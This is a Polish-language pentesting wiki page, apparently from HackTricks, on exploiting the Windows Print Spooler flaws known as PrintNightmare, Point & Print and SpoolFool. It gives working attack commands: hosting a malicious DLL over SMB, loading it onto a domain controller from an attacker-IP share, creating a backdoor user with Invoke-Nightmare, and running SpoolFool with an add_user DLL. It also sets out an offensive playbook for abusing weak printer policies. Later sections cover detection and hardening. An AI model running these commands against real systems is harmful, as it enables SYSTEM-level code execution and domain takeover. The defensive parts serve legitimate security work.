# PrintNightmare (RCE/LPE Windows Print Spooler)

{{#include ../../banners/hacktricks-training.md}}

> PrintNightmare to zbiorcza nazwa rodziny podatności w usłudze Windows **Print Spooler**, które umożliwiają **wykonanie dowolnego kodu jako SYSTEM** oraz, gdy spooler jest dostępny przez RPC, **zdalne wykonanie kodu (RCE) na kontrolerach domeny i serwerach plików**. Najczęściej wykorzystywane CVE to **CVE-2021-1675** (początkowo sklasyfikowane jako LPE) oraz **CVE-2021-34527** (pełne RCE). Późniejsze problemy, takie jak **CVE-2021-34481 („Point & Print”)** i **CVE-2022-21999 („SpoolFool”)**, dowodzą, że powierzchnia ataku nadal jest daleka od pełnego zabezpieczenia.

Jeśli szukasz **wymuszania uwierzytelniania / relay** za pośrednictwem spoolera, a nie **RCE/LPE opartego na sterownikach**, sprawdź [tę inną stronę dotyczącą nadużywania printer coercion](printers-spooler-service-abuse.md). Ta strona koncentruje się na **ładowaniu sterowników / DLL jako SYSTEM**.

---

## 1. Podatne komponenty i CVE

| Rok | CVE | Nazwa skrócona | Primitive | Uwagi |
|------|-----|------------|-----------|-------|
|2021|CVE-2021-1675|„PrintNightmare #1”|LPE|Załatane w CU z czerwca 2021 r., ale obejście umożliwiło CVE-2021-34527|
|2021|CVE-2021-34527|„PrintNightmare”|RCE/LPE|`AddPrinterDriverEx` pozwala uwierzytelnionym użytkownikom ładować DLL sterownika ze zdalnego udziału; po aktualizacjach z sierpnia 2021 r. zazwyczaj wymaga to osłabionych zasad Point & Print|
|2021|CVE-2021-34481|„Point & Print”|LPE|Instalacja niepodpisanych sterowników przez użytkowników niebędących administratorami|
|2022|CVE-2022-21999|„SpoolFool”|LPE|Tworzenie dowolnych katalogów → DLL planting – działa po zastosowaniu poprawek z 2021 r.|

Wszystkie wykorzystują jedną z **metod RPC MS-RPRN / MS-PAR** (`RpcAddPrinterDriver`, `RpcAddPrinterDriverEx`, `RpcAsyncAddPrinterDriver`) lub relacje zaufania wewnątrz **Point & Print**.

## 2. Techniki exploitation

### 2.1 Zdalne przejęcie kontrolera domeny (CVE-2021-34527)

Uwierzytelniony, ale **nieuprzywilejowany** użytkownik domeny może uruchamiać dowolne DLL jako **NT AUTHORITY\SYSTEM** na zdalnym spoolerze (często na DC), wykonując:
```powershell
# 1. Host malicious driver DLL on a share the victim can reach
impacket-smbserver share ./evil_driver/ -smb2support

# 2. Use a PoC to call RpcAddPrinterDriverEx
python3 CVE-2021-1675.py victim_DC.domain.local  'DOMAIN/user:Password!' \
-f \
'\\attacker_IP\share\evil.dll'
```
Popularne PoC obejmują **CVE-2021-1675.py** (Python/Impacket), **SharpPrintNightmare.exe** (C#) oraz moduły `misc::printnightmare / lsa::addsid` Benjamina Delpy’ego w **mimikatz**.

### 2.2 Lokalne podniesienie uprawnień (dowolny obsługiwany Windows, 2021-2024)

To samo API można wywołać **lokalnie**, aby załadować sterownik z `C:\Windows\System32\spool\drivers\x64\3\` i uzyskać uprawnienia SYSTEM:
```powershell
Import-Module .\Invoke-Nightmare.ps1
Invoke-Nightmare -NewUser hacker -NewPassword P@ssw0rd!
```
### 2.3 Nowoczesny triage na załatanych hostach

Na w pełni zaktualizowanym hoście publiczne PoC dla PrintNightmare często zawodzą, ponieważ Windows domyślnie zezwala obecnie wyłącznie administratorom na instalowanie sterowników drukarek (`RestrictDriverInstallationToAdministrators=1` od 10 sierpnia 2021 r.). Zanim uruchomisz exploit przeciwko celowi, najpierw sprawdź, czy w danym środowisku nie wycofano tej zmiany bezpieczeństwa na potrzeby starszych wdrożeń drukarek:<sup>[[3]](#references)</sup>
```cmd
reg query "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint"
```
Dwie najciekawsze słabe wartości to zwykle:<sup>[[3]](#references)</sup>

- `RestrictDriverInstallationToAdministrators = 0`
- `NoWarningNoElevationOnInstall = 1`

Z systemu Linux szybko potwierdź, że cel udostępnia odpowiednie interfejsy print RPC, zanim uruchomisz PoC:
```bash
rpcdump.py @TARGET | egrep 'MS-RPRN|MS-PAR'
```
Niektóre nowsze publicznie dostępne narzędzia oferują również bezpieczniejszy przepływ pracy **check/list** przed wysłaniem DLL:
```bash
python3 printnightmare.py -check 'DOMAIN/user:Password@TARGET'
python3 printnightmare.py -list  'DOMAIN/user:Password@TARGET'
```
> Jeśli jako użytkownik o niskich uprawnieniach otrzymujesz `RPC_E_ACCESS_DENIED` (`0x8001011b`), zwykle oznacza to domyślne ustawienia wprowadzone po 2021 roku, a nie awarię transportu.

> W Windows 11 22H2+ oraz nowszych kompilacjach klienckich zdalne drukowanie domyślnie korzysta z **RPC over TCP**, a **RPC over named pipes** (`\PIPE\spoolss`) jest wyłączone, chyba że zostanie jawnie ponownie włączone. Niektóre starsze PoC i notatki laboratoryjne nadal zakładają, że named pipe jest dostępny.<sup>[[4]](#references)</sup>

### 2.4 Nadużycie Package Point & Print w „załatanych” sieciach

Wiele środowisk enterprise pozostało **podatnych z powodu konfiguracji zasad** po oryginalnych patchach z 2021 roku, ponieważ procesy helpdesku lub print-serverów nadal wymagały od użytkowników bez uprawnień administratora instalowania/aktualizowania sterowników. W praktyce offensive playbook wygląda następująco:

- Jeśli security prompts są całkowicie wyłączone, **classic arbitrary-DLL PrintNightmare** nadal jest najkrótszą ścieżką.
- Jeśli włączono `Only use Package Point and Print`, zwykle trzeba przejść na ścieżkę **signed package-aware driver**, zamiast bezpośrednio umieszczać surowy plik DLL.<sup>[[3]](#references)</sup>
- Badania z 2024 roku wykazały, że **`Package Point and Print - Approved servers` samo w sobie nie stanowi twardej granicy zaufania**: jeśli attacker może spoofować lub przejąć name resolution dla jednego zatwierdzonego print servera, ofiary nadal mogą zostać przekierowane do malicious servera spełniającego wymogi policy.<sup>[[4]](#references)</sup>
- Nawet połączenie UNC hardening z wymuszonym RPC-over-SMB może być zawodne, ponieważ nowoczesne clients mogą **fall back do RPC over TCP**.<sup>[[4]](#references)</sup>

Dlatego współczesne exploity w stylu PrintNightmare często polegają bardziej na **nadużywaniu enterprise printer deployment policy** niż na ponownym użyciu oryginalnego PoC z 2021 roku bez zmian.

### 2.5 SpoolFool (CVE-2022-21999) – omijanie poprawek z 2021 roku

Patche Microsoftu z 2021 roku zablokowały zdalne ładowanie sterowników, ale **nie zabezpieczyły uprawnień do katalogów**. SpoolFool nadużywa parametru `SpoolDirectory`, aby utworzyć dowolny katalog w `C:\Windows\System32\spool\drivers\`, umieścić w nim payload DLL i wymusić załadowanie go przez spooler:<sup>[[2]](#references)</sup>
```powershell
# Binary version (local exploit)
SpoolFool.exe -dll add_user.dll

# PowerShell wrapper
Import-Module .\SpoolFool.ps1 ; Invoke-SpoolFool -dll add_user.dll
```
> Exploit działa na w pełni załatanych systemach Windows 7 → Windows 11 oraz Server 2012R2 → 2022 przed aktualizacjami z lutego 2022 r.<sup>[[2]](#references)</sup>

---

## 3. Wykrywanie i hunting

* **Logi PrintService** – włącz kanał *Microsoft-Windows-PrintService/Operational* i monitoruj **Event ID 316** (dodano/zaktualizowano sterownik, zwykle zawiera nazwy bibliotek DLL) zarówno podczas udanych, jak i nieudanych prób. Połącz go z **Event ID 808/811**, aby wykrywać podejrzane błędy ładowania modułów/sterowników spoolera.
* **Sysmon** – `Event ID 7` (załadowano obraz) lub `11/23` (zapis/usunięcie pliku) w obrębie `C:\Windows\System32\spool\drivers\*`, gdy procesem nadrzędnym jest **spoolsv.exe**.
* **Linia procesów** – generuj alert za każdym razem, gdy **spoolsv.exe** uruchamia `cmd.exe`, `rundll32.exe`, PowerShell lub dowolny nieoczekiwany, niepodpisany proces potomny.
* **Telemetria sieciowa** – nieoczekiwane pobieranie SMB z **spoolsv.exe** z udziałów kontrolowanych przez atakującego lub nietypowy ruch RPC drukarek z serwerów, które nie powinny działać jako serwery wydruku, to wartościowe sygnały do dalszej analizy.

## 4. Ograniczanie ryzyka i hardening

1. **Zainstaluj poprawki!** – zastosuj najnowszą aktualizację zbiorczą na każdym hoście Windows, na którym zainstalowana jest usługa Print Spooler.
2. **Wyłącz spooler tam, gdzie nie jest wymagany**, szczególnie na Domain Controllers:
```powershell
Stop-Service Spooler -Force
Set-Service Spooler -StartupType Disabled
```
3. **Zablokuj połączenia zdalne**, jednocześnie zezwalając na drukowanie lokalne – Group Policy: `Computer Configuration → Administrative Templates → Printers → Allow Print Spooler to accept client connections = Disabled`.
4. **Ogranicz Point & Print wyłącznie do administratorów**, ustawiając:
```cmd
reg add "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint" \
/v RestrictDriverInstallationToAdministrators /t REG_DWORD /d 1 /f
```
Szczegółowe wytyczne znajdują się w Microsoft KB5005652<sup>[[1]](#references)</sup>
5. Jeśli wymagania biznesowe wymuszają `RestrictDriverInstallationToAdministrators=0`, traktuj każdą inną politykę drukarek wyłącznie jako **częściowe ograniczenie ryzyka**. Co najmniej preferuj **package-aware drivers**, włącz **Only use Package Point and Print** oraz ogranicz **Package Point and Print - Approved servers** do jawnie określonych serwerów wydruku w lesie.<sup>[[3]](#references)</sup>
6. **Nie wycofuj ochrony prywatności RPC drukarek** tylko po to, aby naprawić niedziałające mapowania drukarek. Środowiska, w których ustawiono `RpcAuthnLevelPrivacyEnabled=0`, cofają hardening dodany dla **CVE-2021-1678** i zwykle wymagają szczególnej uwagi podczas engagementu.<sup>[[4]](#references)</sup>

---

## 5. Powiązane badania / narzędzia

* Moduły `printnightmare` dla [mimikatz](https://github.com/gentilkiwi/mimikatz/tree/master/modules)
* [`ly4k/PrintNightmare`](https://github.com/ly4k/PrintNightmare) – standardowa implementacja Impacket z trybami `-check`, `-list` i `-delete`
* [`m8sec/CVE-2021-34527`](https://github.com/m8sec/CVE-2021-34527) – wrapper z wbudowanym dostarczaniem SMB, obsługą wielu celów oraz trybami `MS-RPRN` / `MS-PAR`
* SharpPrintNightmare (C#) / Invoke-Nightmare (PowerShell)
* [`Concealed Position`](https://github.com/jacob-baines/concealed_position) – abuse własnego podatnego sterownika drukarki poprzez package Point & Print
* Exploit i write-up SpoolFool
* Mikropoprawki 0patch dla SpoolFool i innych błędów spoolera

Jeśli chcesz **wymusić uwierzytelnianie** za pośrednictwem spoolera zamiast ładować sterownik, przejdź do [printer spooler service abuse](printers-spooler-service-abuse.md).

---

## Referencje

- [1] [Microsoft – KB5005652: Zarządzanie nowym domyślnym zachowaniem instalacji sterowników Point & Print](https://support.microsoft.com/en-us/topic/kb5005652-manage-new-point-and-print-default-driver-installation-behavior-cve-2021-34481-873642bf-2634-49c5-a23b-6d8e9a302872)
- [2] [Oliver Lyak – SpoolFool: CVE-2022-21999](https://github.com/ly4k/SpoolFool)
- [3] [itm4n – Praktyczny przewodnik po PrintNightmare w 2024 roku](https://itm4n.github.io/printnightmare-exploitation/)
- [4] [itm4n – PrintNightmare jeszcze się nie skończył](https://itm4n.github.io/printnightmare-not-over/)

{{#include ../../banners/hacktricks-training.md}}
